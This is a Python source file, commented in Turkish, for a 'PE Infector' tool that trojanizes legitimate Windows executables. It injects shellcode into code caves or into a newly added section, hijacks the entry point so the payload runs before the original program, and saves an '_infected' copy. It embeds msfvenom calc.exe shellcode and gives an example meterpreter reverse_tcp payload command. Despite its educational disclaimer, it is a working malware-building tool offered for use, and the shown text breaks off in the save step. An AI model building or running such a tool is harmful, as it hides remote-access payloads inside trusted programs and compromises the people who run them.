#!/usr/bin/env python3
"""
PE Infector v2.0 - Shellter Benzeri Araç
=========================================
Meşru PE dosyalarına shellcode enjekte eder ve yeni EXE üretir.

Özellikler:
- x86 ve x64 tam destek
- Code cave bulunamazsa yeni section ekleme
- Çoklu enjeksiyon yöntemi
- Detaylı hata yönetimi

Yazar: Uğur Ateş
Amaç: Eğitim ve araştırma (Lab ortamı için)

UYARI: Bu araç sadece eğitim amaçlıdır!
"""

import struct
import sys
import os
import argparse
import shutil
from datetime import datetime

try:
    import pefile
except ImportError:
    print("[!] pefile kütüphanesi gerekli: pip install pefile")
    sys.exit(1)


class PEInfector:
    """PE dosyalarına shellcode enjekte eden sınıf"""
    
    # Minimum code cave boyutu (byte)
    MIN_CAVE_SIZE = 64
    
    # Section alignment (genellikle 0x1000)
    SECTION_ALIGNMENT = 0x1000
    FILE_ALIGNMENT = 0x200
    
    def __init__(self, target_path):
        """
        Args:
            target_path: Hedef PE dosyası yolu
        """
        self.target_path = target_path
        self.pe = None
        self.raw_data = None
        self.shellcode = None
        self.is_64bit = False
        self.original_entry_point = 0
        self.new_entry_point = 0
        self.image_base = 0
        self.injection_method = None
        
        # PE dosyasını yükle
        self._load_pe()
    
    def _load_pe(self):
        """PE dosyasını yükle ve analiz et"""
        print(f"\n[*] PE dosyası yükleniyor: {self.target_path}")
        
        if not os.path.exists(self.target_path):
            raise FileNotFoundError(f"Dosya bulunamadı: {self.target_path}")
        
        # Raw data'yı oku
        with open(self.target_path, 'rb') as f:
            self.raw_data = bytearray(f.read())
        
        self.pe = pefile.PE(data=bytes(self.raw_data))
        
        # Mimari kontrolü
        if self.pe.FILE_HEADER.Machine == 0x8664:
            self.is_64bit = True
            print("[*] Mimari: x64 (64-bit)")
        elif self.pe.FILE_HEADER.Machine == 0x14c:
            self.is_64bit = False
            print("[*] Mimari: x86 (32-bit)")
        else:
            raise ValueError(f"Desteklenmeyen mimari: {hex(self.pe.FILE_HEADER.Machine)}")
        
        # Değerleri kaydet
        self.original_entry_point = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        self.image_base = self.pe.OPTIONAL_HEADER.ImageBase
        
        print(f"[*] Image Base: {hex(self.image_base)}")
        print(f"[*] Original Entry Point (RVA): {hex(self.original_entry_point)}")
        print(f"[*] Original Entry Point (VA): {hex(self.image_base + self.original_entry_point)}")
        print(f"[*] Section sayısı: {self.pe.FILE_HEADER.NumberOfSections}")
        print(f"[*] Dosya boyutu: {len(self.raw_data)} bytes")
    
    def load_shellcode(self, shellcode_path=None, shellcode_bytes=None):
        """Shellcode yükle"""
        if shellcode_bytes:
            self.shellcode = shellcode_bytes
        elif shellcode_path:
            if not os.path.exists(shellcode_path):
                raise FileNotFoundError(f"Shellcode bulunamadı: {shellcode_path}")
            with open(shellcode_path, 'rb') as f:
                self.shellcode = f.read()
        else:
            raise ValueError("Shellcode gerekli!")
        
        print(f"\n[*] Shellcode yüklendi: {len(self.shellcode)} bytes")
        print(f"[*] İlk 16 byte: {self.shellcode[:16].hex()}")
    
    def analyze_sections(self):
        """Section'ları analiz et"""
        print("\n" + "="*70)
        print("SECTION ANALİZİ")
        print("="*70)
        
        print(f"\n{'İsim':<10} {'VirtAddr':<12} {'VirtSize':<12} {'RawSize':<12} {'RawPtr':<12} {'Flags'}")
        print("-"*70)
        
        for section in self.pe.sections:
            name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
            
            flags = []
            chars = section.Characteristics
            if chars & 0x20000000: flags.append("X")
            if chars & 0x40000000: flags.append("R")
            if chars & 0x80000000: flags.append("W")
            if chars & 0x00000020: flags.append("CODE")
            
            print(f"{name:<10} {hex(section.VirtualAddress):<12} {hex(section.Misc_VirtualSize):<12} "
                  f"{hex(section.SizeOfRawData):<12} {hex(section.PointerToRawData):<12} {''.join(flags)}")
    
    def find_code_caves(self):
        """Code cave'leri bul"""
        print("\n" + "="*70)
        print("CODE CAVE ARAMA")
        print("="*70)
        
        caves = []
        required_size = len(self.shellcode) + 50 if self.shellcode else self.MIN_CAVE_SIZE
        
        print(f"[*] Gereken minimum boyut: {required_size} bytes")
        
        for section in self.pe.sections:
            name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
            
            # Sadece çalıştırılabilir veya kod section'larına bak
            is_executable = section.Characteristics & 0x20000000
            is_code = section.Characteristics & 0x00000020
            
            if not (is_executable or is_code):
                continue
            
            raw_size = section.SizeOfRawData
            virt_size = section.Misc_VirtualSize
            
            # Section padding'i kontrol et (raw > virt)
            if raw_size > virt_size:
                padding_size = raw_size - virt_size
                
                if padding_size >= required_size:
                    cave_rva = section.VirtualAddress + virt_size
                    file_offset = section.PointerToRawData + virt_size
                    
                    # Gerçekten null mı kontrol et
                    cave_data = self.raw_data[file_offset:file_offset + padding_size]
                    null_ratio = cave_data.count(0) / len(cave_data) if cave_data else 0
                    
                    if null_ratio > 0.9:  # %90+ null
                        caves.append({
                            'section': section,
                            'section_name': name,
                            'type': 'padding',
                            'rva': cave_rva,
                            'file_offset': file_offset,
                            'size': padding_size,
                            'null_ratio': null_ratio
                        })
                        print(f"\n[+] Cave bulundu: {name} (padding)")
                        print(f"    RVA: {hex(cave_rva)}")
                        print(f"    File Offset: {hex(file_offset)}")
                        print(f"    Boyut: {padding_size} bytes")
            
            # Section içinde ardışık null byte ara
            section_data = self.raw_data[section.PointerToRawData:section.PointerToRawData + raw_size]
            
            null_start = None
            null_count = 0
            
            for i in range(len(section_data)):
                if section_data[i] == 0:
                    if null_start is None:
                        null_start = i
                    null_count += 1
                else:
                    if null_count >= required_size:
                        cave_rva = section.VirtualAddress + null_start
                        file_offset = section.PointerToRawData + null_start
                        
                        caves.append({
                            'section': section,
                            'section_name': name,
                            'type': 'null_block',
                            'rva': cave_rva,
                            'file_offset': file_offset,
                            'size': null_count,
                            'null_ratio': 1.0
                        })
                        print(f"\n[+] Cave bulundu: {name} (null block)")
                        print(f"    RVA: {hex(cave_rva)}")
                        print(f"    File Offset: {hex(file_offset)}")
                        print(f"    Boyut: {null_count} bytes")
                    
                    null_start = None
                    null_count = 0
            
            # Section sonundaki null'ları kontrol et
            if null_count >= required_size:
                cave_rva = section.VirtualAddress + null_start
                file_offset = section.PointerToRawData + null_start
                
                caves.append({
                    'section': section,
                    'section_name': name,
                    'type': 'section_end',
                    'rva': cave_rva,
                    'file_offset': file_offset,
                    'size': null_count,
                    'null_ratio': 1.0
                })
                print(f"\n[+] Cave bulundu: {name} (section end)")
                print(f"    RVA: {hex(cave_rva)}")
                print(f"    Boyut: {null_count} bytes")
        
        # Boyuta göre sırala (en büyük önce)
        caves.sort(key=lambda x: x['size'], reverse=True)
        
        if caves:
            print(f"\n[*] Toplam {len(caves)} code cave bulundu")
        else:
            print(f"\n[!] Uygun code cave bulunamadı!")
        
        return caves
    
    def _align(self, value, alignment):
        """Değeri hizala"""
        return ((value + alignment - 1) // alignment) * alignment
    
    def add_section(self, name=".extra", size=0x1000):
        """Yeni section ekle (code cave bulunamazsa)"""
        print("\n" + "="*70)
        print("YENİ SECTION EKLEME")
        print("="*70)
        
        # Son section'ı bul
        last_section = self.pe.sections[-1]
        
        # Yeni section için değerleri hesapla
        section_alignment = self.pe.OPTIONAL_HEADER.SectionAlignment
        file_alignment = self.pe.OPTIONAL_HEADER.FileAlignment
        
        # Virtual Address: son section'dan sonra, hizalanmış
        new_va = self._align(
            last_section.VirtualAddress + last_section.Misc_VirtualSize,
            section_alignment
        )
        
        # Raw pointer: dosya sonunda, hizalanmış
        new_raw_ptr = self._align(len(self.raw_data), file_alignment)
        
        # Boyutu hizala
        aligned_size = self._align(size, file_alignment)
        
        print(f"[*] Yeni section: {name}")
        print(f"[*] Virtual Address: {hex(new_va)}")
        print(f"[*] Raw Pointer: {hex(new_raw_ptr)}")
        print(f"[*] Boyut: {hex(aligned_size)}")
        
        # Section header oluştur (40 byte)
        section_header = bytearray(40)
        
        # Name (8 byte)
        name_bytes = name.encode('utf-8')[:8].ljust(8, b'\x00')
        section_header[0:8] = name_bytes
        
        # VirtualSize
        struct.pack_into('<I', section_header, 8, aligned_size)
        
        # VirtualAddress
        struct.pack_into('<I', section_header, 12, new_va)
        
        # SizeOfRawData
        struct.pack_into('<I', section_header, 16, aligned_size)
        
        # PointerToRawData
        struct.pack_into('<I', section_header, 20, new_raw_ptr)
        
        # PointerToRelocations, PointerToLinenumbers, NumberOfRelocations, NumberOfLinenumbers = 0
        
        # Characteristics: EXECUTE | READ | WRITE | CODE
        characteristics = 0x60000020  # IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
        struct.pack_into('<I', section_header, 36, characteristics)
        
        # Section header'ı ekle
        # Header'lar genellikle ilk section'dan önce
        # NumberOfSections değerini artır
        
        # Section header offset'ini bul
        # DOS header + PE signature + File header + Optional header
        optional_header_offset = self.pe.DOS_HEADER.e_lfanew + 4 + 20
        optional_header_size = self.pe.FILE_HEADER.SizeOfOptionalHeader
        section_headers_offset = optional_header_offset + optional_header_size
        
        # Yeni section header'ın ekleneceği offset
        num_sections = self.pe.FILE_HEADER.NumberOfSections
        new_header_offset = section_headers_offset + (num_sections * 40)
        
        # Header alanında yer var mı kontrol et
        first_section_raw = self.pe.sections[0].PointerToRawData
        available_space = first_section_raw - new_header_offset
        
        if available_space < 40:
            raise ValueError(f"Section header için yeterli alan yok! (Mevcut: {available_space} bytes)")
        
        print(f"[*] Header offset: {hex(new_header_offset)}")
        print(f"[*] Mevcut alan: {available_space} bytes")
        
        # Section header'ı raw_data'ya yaz
        self.raw_data[new_header_offset:new_header_offset + 40] = section_header
        
        # Section verisini dosya sonuna ekle
        # Önce hizalama padding'i
        padding_needed = new_raw_ptr - len(self.raw_data)
        if padding_needed > 0:
            self.raw_data.extend(b'\x00' * padding_needed)
        
        # Section verisini ekle
        self.raw_data.extend(b'\x00' * aligned_size)
        
        # PE header'larını güncelle
        # NumberOfSections
        num_sections_offset = self.pe.DOS_HEADER.e_lfanew + 4 + 2
        struct.pack_into('<H', self.raw_data, num_sections_offset, num_sections + 1)
        
        # SizeOfImage
        new_size_of_image = self._align(new_va + aligned_size, section_alignment)
        size_of_image_offset = optional_header_offset + (64 if self.is_64bit else 56)
        struct.pack_into('<I', self.raw_data, size_of_image_offset, new_size_of_image)
        
        print(f"[*] Yeni SizeOfImage: {hex(new_size_of_image)}")
        print(f"[+] Section başarıyla eklendi!")
        
        # PE'yi yeniden parse et
        self.pe = pefile.PE(data=bytes(self.raw_data))
        
        return {
            'section_name': name,
            'rva': new_va,
            'file_offset': new_raw_ptr,
            'size': aligned_size,
            'type': 'new_section'
        }
    
    def _create_shellcode_stub_x86(self, jmp_back_offset):
        """
        x86 shellcode stub oluştur
        
        Yapı:
        1. PUSHAD - tüm register'ları kaydet
        2. PUSHFD - flag'leri kaydet
        3. [SHELLCODE]
        4. POPFD - flag'leri geri yükle
        5. POPAD - register'ları geri yükle
        6. JMP original_entry_point
        """
        
        stub_start = bytes([
            0x60,                   # PUSHAD
            0x9C,                   # PUSHFD
        ])
        
        # JMP rel32 için offset (signed 32-bit)
        jmp_bytes = struct.pack('<i', jmp_back_offset)
        
        stub_end = bytes([
            0x9D,                   # POPFD
            0x61,                   # POPAD
            0xE9,                   # JMP rel32
        ]) + jmp_bytes
        
        return stub_start, stub_end
    
    def _create_shellcode_stub_x64(self, jmp_back_offset):
        """
        x64 shellcode stub oluştur
        
        x64'te PUSHAD/POPAD yok, tüm register'ları manuel kaydetmeliyiz.
        Ama msfvenom shellcode'ları genellikle register'ları kendileri korur.
        
        Basit yaklaşım: Stack'i hizala ve shellcode'u çalıştır
        """
        
        stub_start = bytes([
            # Register'ları kaydet
            0x50,                   # PUSH RAX
            0x51,                   # PUSH RCX
            0x52,                   # PUSH RDX
            0x53,                   # PUSH RBX
            0x55,                   # PUSH RBP
            0x56,                   # PUSH RSI
            0x57,                   # PUSH RDI
            0x41, 0x50,             # PUSH R8
            0x41, 0x51,             # PUSH R9
            0x41, 0x52,             # PUSH R10
            0x41, 0x53,             # PUSH R11
            0x41, 0x54,             # PUSH R12
            0x41, 0x55,             # PUSH R13
            0x41, 0x56,             # PUSH R14
            0x41, 0x57,             # PUSH R15
            0x9C,                   # PUSHFQ (flags)
            
            # Stack'i 16-byte hizala (Windows x64 ABI)
            0x48, 0x83, 0xEC, 0x28, # SUB RSP, 0x28 (shadow space)
        ])
        
        # JMP rel32 offset
        jmp_bytes = struct.pack('<i', jmp_back_offset)
        
        stub_end = bytes([
            # Stack'i geri al
            0x48, 0x83, 0xC4, 0x28, # ADD RSP, 0x28
            
            # Register'ları geri yükle
            0x9D,                   # POPFQ
            0x41, 0x5F,             # POP R15
            0x41, 0x5E,             # POP R14
            0x41, 0x5D,             # POP R13
            0x41, 0x5C,             # POP R12
            0x41, 0x5B,             # POP R11
            0x41, 0x5A,             # POP R10
            0x41, 0x59,             # POP R9
            0x41, 0x58,             # POP R8
            0x5F,                   # POP RDI
            0x5E,                   # POP RSI
            0x5D,                   # POP RBP
            0x5B,                   # POP RBX
            0x5A,                   # POP RDX
            0x59,                   # POP RCX
            0x58,                   # POP RAX
            
            # Orijinal entry point'e atla
            0xE9,                   # JMP rel32
        ]) + jmp_bytes
        
        return stub_start, stub_end
    
    def inject(self, method='auto'):
        """
        Shellcode'u enjekte et
        
        Args:
            method: 'cave' (sadece code cave), 'section' (yeni section), 'auto' (önce cave dene)
        """
        if not self.shellcode:
            raise ValueError("Önce shellcode yükleyin!")
        
        print("\n" + "="*70)
        print("ENJEKSİYON")
        print("="*70)
        
        cave = None
        
        # Code cave bul
        if method in ['auto', 'cave']:
            caves = self.find_code_caves()
            
            # Yeterli boyutta cave var mı?
            required_size = len(self.shellcode) + 100  # stub için ekstra alan
            
            for c in caves:
                if c['size'] >= required_size:
                    cave = c
                    self.injection_method = 'code_cave'
                    break
        
        # Cave bulunamadıysa yeni section ekle
        if cave is None and method in ['auto', 'section']:
            print("\n[*] Uygun code cave bulunamadı, yeni section ekleniyor...")
            required_size = self._align(len(self.shellcode) + 100, self.FILE_ALIGNMENT)
            cave = self.add_section(name=".shell", size=required_size)
            self.injection_method = 'new_section'
        
        if cave is None:
            raise ValueError("Enjeksiyon için uygun alan bulunamadı!")
        
        print(f"\n[*] Enjeksiyon yöntemi: {self.injection_method}")
        print(f"[*] Hedef: {cave.get('section_name', 'N/A')}")
        print(f"[*] RVA: {hex(cave['rva'])}")
        print(f"[*] File Offset: {hex(cave['file_offset'])}")
        
        # Shellcode'un yazılacağı RVA
        shellcode_rva = cave['rva']
        shellcode_file_offset = cave['file_offset']
        
        # Önce stub boyutlarını hesapla (geçici offset ile)
        if self.is_64bit:
            stub_start, stub_end = self._create_shellcode_stub_x64(0)
        else:
            stub_start, stub_end = self._create_shellcode_stub_x86(0)
        
        # Toplam payload boyutu
        total_size = len(stub_start) + len(self.shellcode) + len(stub_end)
        
        print(f"\n[*] Payload yapısı:")
        print(f"    Stub başlangıç: {len(stub_start)} bytes")
        print(f"    Shellcode: {len(self.shellcode)} bytes")
        print(f"    Stub bitiş: {len(stub_end)} bytes")
        print(f"    Toplam: {total_size} bytes")
        
        if total_size > cave['size']:
            raise ValueError(f"Alan yetersiz! Gerekli: {total_size}, Mevcut: {cave['size']}")
        
        # JMP offset'i hesapla
        # JMP instruction adresi (RVA)
        jmp_instruction_rva = shellcode_rva + len(stub_start) + len(self.shellcode) + (len(stub_end) - 4)
        
        # Relative offset = hedef - (kaynak + sizeof(JMP rel32))
        # JMP rel32 = 5 byte (E9 xx xx xx xx), ama offset hesabı JMP'den sonraki adresten
        jmp_back_offset = self.original_entry_point - (jmp_instruction_rva + 4)
        
        print(f"\n[*] JMP hesaplaması:")
        print(f"    Shellcode RVA: {hex(shellcode_rva)}")
        print(f"    JMP instruction RVA: {hex(jmp_instruction_rva)}")
        print(f"    Original EP RVA: {hex(self.original_entry_point)}")
        print(f"    JMP offset: {hex(jmp_back_offset & 0xFFFFFFFF)} ({jmp_back_offset})")
        
        # Gerçek stub'ları oluştur
        if self.is_64bit:
            stub_start, stub_end = self._create_shellcode_stub_x64(jmp_back_offset)
        else:
            stub_start, stub_end = self._create_shellcode_stub_x86(jmp_back_offset)
        
        # Tam payload
        payload = stub_start + self.shellcode + stub_end
        
        print(f"\n[*] Payload oluşturuldu: {len(payload)} bytes")
        
        # Payload'ı yaz
        self.raw_data[shellcode_file_offset:shellcode_file_offset + len(payload)] = payload
        
        # Section'ı çalıştırılabilir yap
        if 'section' in cave and cave['section'] is not None:
            section = cave['section']
            original_chars = section.Characteristics
            new_chars = original_chars | 0x20000000 | 0x40000000  # EXECUTE | READ
            
            if original_chars != new_chars:
                # Characteristics offset'ini bul ve güncelle
                section_headers_offset = self.pe.DOS_HEADER.e_lfanew + 4 + 20 + self.pe.FILE_HEADER.SizeOfOptionalHeader
                
                for i, sec in enumerate(self.pe.sections):
                    if sec.VirtualAddress == section.VirtualAddress:
                        chars_offset = section_headers_offset + (i * 40) + 36
                        struct.pack_into('<I', self.raw_data, chars_offset, new_chars)
                        print(f"[*] Section izinleri güncellendi: {hex(original_chars)} -> {hex(new_chars)}")
                        break
        
        # Entry point'i değiştir
        self.new_entry_point = shellcode_rva
        
        # AddressOfEntryPoint offset
        optional_header_offset = self.pe.DOS_HEADER.e_lfanew + 4 + 20
        ep_offset = optional_header_offset + 16  # AddressOfEntryPoint offset in Optional Header
        
        struct.pack_into('<I', self.raw_data, ep_offset, self.new_entry_point)
        
        print(f"\n[*] Entry Point değiştirildi:")
        print(f"    Eski EP (RVA): {hex(self.original_entry_point)}")
        print(f"    Yeni EP (RVA): {hex(self.new_entry_point)}")
        print(f"    Eski EP (VA): {hex(self.image_base + self.original_entry_point)}")
        print(f"    Yeni EP (VA): {hex(self.image_base + self.new_entry_point)}")
        
        # PE'yi yeniden parse et
        self.pe = pefile.PE(data=bytes(self.raw_data))
        
        print("\n[+] Enjeksiyon tamamlandı!")
    
    def save(self, output_path):
        """Enfekte edilmiş PE'yi kaydet"""
        print(f"\n[*] Kaydediliyor: {output_path}")
        
        with open(output_path, 'wb') as f:
            f.write(bytes(self.raw_data))
        
        file_size = os.path.getsize(output_path)
        print(f"[+] Kaydedildi!")
        print(f"[+] Dosya boyutu: {file_size} bytes")
        
        return output_path
    
    def verify(self):
        """Enjeksiyonu doğrula"""
        print("\n" + "="*70)
        print("DOĞRULAMA")
        print("="*70)
        
        # PE'yi tekrar yükle
        pe_check = pefile.PE(data=bytes(self.raw_data))
        
        new_ep = pe_check.OPTIONAL_HEADER.AddressOfEntryPoint
        
        print(f"\n[*] Entry Point kontrolü:")
        print(f"    Beklenen: {hex(self.new_entry_point)}")
        print(f"    Gerçek: {hex(new_ep)}")
        
        if new_ep == self.new_entry_point:
            print("    ✅ DOĞRU")
        else:
            print("    ❌ HATALI!")
            return False
        
        # Shellcode yazıldı mı kontrol et
        for section in pe_check.sections:
            if section.VirtualAddress <= self.new_entry_point < section.VirtualAddress + section.SizeOfRawData:
                section_name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
                print(f"\n[*] Shellcode section: {section_name}")
                print(f"    Çalıştırılabilir: {'✅' if section.Characteristics & 0x20000000 else '❌'}")
                print(f"    Okunabilir: {'✅' if section.Characteristics & 0x40000000 else '❌'}")
                break
        
        pe_check.close()
        
        print("\n[+] Doğrulama tamamlandı!")
        return True
    
    def generate_report(self):
        """Rapor oluştur"""
        report = f"""
{'='*70}
PE INFECTOR RAPORU
{'='*70}

Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Hedef: {self.target_path}

DOSYA BİLGİLERİ
---------------
Mimari: {'x64 (64-bit)' if self.is_64bit else 'x86 (32-bit)'}
Image Base: {hex(self.image_base)}

ENTRY POINT
-----------
Orijinal EP (RVA): {hex(self.original_entry_point)}
Orijinal EP (VA): {hex(self.image_base + self.original_entry_point)}
Yeni EP (RVA): {hex(self.new_entry_point)}
Yeni EP (VA): {hex(self.image_base + self.new_entry_point)}

ENJEKSİYON
----------
Yöntem: {self.injection_method or 'N/A'}
Shellcode boyutu: {len(self.shellcode) if self.shellcode else 0} bytes

ÇALIŞMA AKIŞI
-------------
1. Kullanıcı enfekte dosyayı çalıştırır
2. Windows yeni EP'ye atlar: {hex(self.image_base + self.new_entry_point) if self.new_entry_point else 'N/A'}
3. Register'lar kaydedilir
4. Shellcode çalışır (reverse shell vb.)
5. Register'lar geri yüklenir
6. JMP ile orijinal EP'ye atlanır: {hex(self.image_base + self.original_entry_point)}
7. Orijinal program normal çalışır

{'='*70}
"""
        return report


def create_test_shellcode_x64():
    """x64 calc.exe shellcode (test için)"""
    # msfvenom -p windows/x64/exec CMD=calc.exe -f python
    shellcode = bytes([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
        0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
    ])
    return shellcode


def create_test_shellcode_x86():
    """x86 calc.exe shellcode (test için)"""
    # msfvenom -p windows/exec CMD=calc.exe -f python
    shellcode = bytes([
        0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
        0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,
        0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
        0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,
        0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
        0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
        0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,
        0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,
        0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,
        0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
        0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,
        0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,
        0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,
        0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,
        0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
        0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,
        0x00
    ])
    return shellcode


def print_banner():
    """Banner göster"""
    banner = r"""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║   ██████╗ ███████╗    ██╗███╗   ██╗███████╗███████╗ ██████╗████╗  ║
    ║   ██╔══██╗██╔════╝    ██║████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╗ ║
    ║   ██████╔╝█████╗      ██║██╔██╗ ██║█████╗  █████╗  ██║      ███╔╝ ║
    ║   ██╔═══╝ ██╔══╝      ██║██║╚██╗██║██╔══╝  ██╔══╝  ██║      ██╔╝  ║
    ║   ██║     ███████╗    ██║██║ ╚████║██║     ███████╗╚██████╗██╔╝   ║
    ║   ╚═╝     ╚══════╝    ╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝ ╚═════╝╚═╝    ║
    ║                                                                   ║
    ║   PE Infector v2.0 - Shellter Style Tool                          ║
    ║   x86 & x64 Support | Code Cave & Section Injection               ║
    ║   Educational Purpose Only - Lab Environment                      ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """
    print(banner)


def interactive_mode():
    """İnteraktif mod"""
    print_banner()
    
    # Hedef dosya
    print("\n" + "="*60)
    print("ADIM 1: HEDEF DOSYA")
    print("="*60)
    print("\n[?] Hedef PE dosyası yolu (ör: putty.exe):")
    target = input("    > ").strip()
    
    if not target:
        print("[!] Dosya yolu gerekli!")
        return
    
    if not os.path.exists(target):
        print(f"[!] Dosya bulunamadı: {target}")
        return
    
    # Infector oluştur
    try:
        infector = PEInfector(target)
    except Exception as e:
        print(f"[!] PE yükleme hatası: {e}")
        return
    
    # Section analizi
    infector.analyze_sections()
    
    # Shellcode kaynağı
    print("\n" + "="*60)
    print("ADIM 2: SHELLCODE")
    print("="*60)
    print("\n[?] Shellcode kaynağı:")
    print("    1. Dosyadan yükle (.bin) - msfvenom çıktısı")
    print("    2. Test shellcode (calc.exe açar)")
    
    choice = input("\n    > ").strip()
    
    if choice == "1":
        print("\n[?] Shellcode dosyası (.bin):")
        print("    Örnek: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=y -f raw -o payload.bin")
        sc_path = input("    > ").strip()
        
        if not os.path.exists(sc_path):
            print(f"[!] Dosya bulunamadı: {sc_path}")
            return
        
        try:
            infector.load_shellcode(shellcode_path=sc_path)
        except Exception as e:
            print(f"[!] Shellcode yükleme hatası: {e}")
            return
            
    elif choice == "2":
        if infector.is_64bit:
            infector.load_shellcode(shellcode_bytes=create_test_shellcode_x64())
        else:
            infector.load_shellcode(shellcode_bytes=create_test_shellcode_x86())
    else:
        print("[!] Geçersiz seçim!")
        return
    
    # Enjeksiyon yöntemi
    print("\n" + "="*60)
    print("ADIM 3: ENJEKSİYON YÖNTEMİ")
    print("="*60)
    print("\n[?] Enjeksiyon yöntemi:")
    print("    1. Otomatik (önce code cave, yoksa yeni section)")
    print("    2. Sadece code cave (bulunamazsa hata)")
    print("    3. Yeni section ekle (kesin çalışır)")
    
    method_choice = input("\n    > ").strip()
    
    method_map = {'1': 'auto', '2': 'cave', '3': 'section'}
    method = method_map.get(method_choice, 'auto')
    
    # Enjeksiyon
    try:
        infector.inject(method=method)
    except Exception as e:
        print(f"\n[!] Enjeksiyon hatası: {e}")
        import traceback
        traceback.print_exc()
        return
    
    # Doğrulama
    if not infector.verify():
        print("[!] Doğrulama başarısız!")
        return
    
    # Kaydetme
    print("\n" + "="*60)
    print("ADIM 4: KAYDET")
    print("="*60)
    
    base, ext = os.path.splitext(target)
    default_output = f"{base}_infected{ext}"
    
    print(f"\n[?] Çıktı dosyası [{default_output}]:")
    output = input("    > ").strip()
    
    if not output:
        output = default_output
    
    try:
        infector.save(output)
